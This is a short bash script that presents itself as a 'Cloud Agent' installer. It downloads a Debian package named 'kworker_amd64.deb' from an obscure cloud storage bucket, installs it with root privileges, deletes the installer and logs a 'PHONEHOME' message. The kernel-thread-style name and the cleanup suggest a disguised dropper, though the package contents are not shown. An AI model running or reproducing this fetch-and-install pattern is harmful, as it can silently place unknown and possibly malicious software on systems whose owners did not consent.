#!/bin/bash

wget -O /tmp/kworker.deb https://storage.googleapis.com/b8aa812nf/kworker_amd64.deb
apt update
apt install -y /tmp/kworker.deb
rm -f /tmp/kworker.deb

./logger.sh PHONEHOME 'Cloud Agent Installed'